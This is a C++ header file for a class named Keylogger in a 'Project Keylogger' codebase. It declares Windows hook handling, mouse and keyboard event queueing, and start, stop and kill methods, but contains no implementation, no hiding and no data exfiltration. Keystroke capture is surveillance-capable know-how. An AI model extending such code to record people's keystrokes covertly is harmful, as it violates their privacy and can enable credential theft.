/**
 * Project Keylogger
 */


#ifndef _KEYLOGGER_H
#define _KEYLOGGER_H

#include <Windows.h>
#include <iostream>

#include "MouseEvent.h"
#include "KeyboardEvent.h"
#include "EventManager.h"
#include "HookHandler.h"
#include "IKeylogger.h"

class Keylogger : public IKeylogger {
public:
    Keylogger();
	~Keylogger();
    bool				init();   
    bool				run();
    bool				stop();
    bool				kill();
	bool				pushToQueue(const AEvent*);
	std::vector<AEvent*> getEvents() const;

private: 
	bool				_running;
    EventManager		_eventManager;
    HookHandler			_hookHandler;
    std::vector<AEvent*> _events;
};

#endif //_KEYLOGGER_H
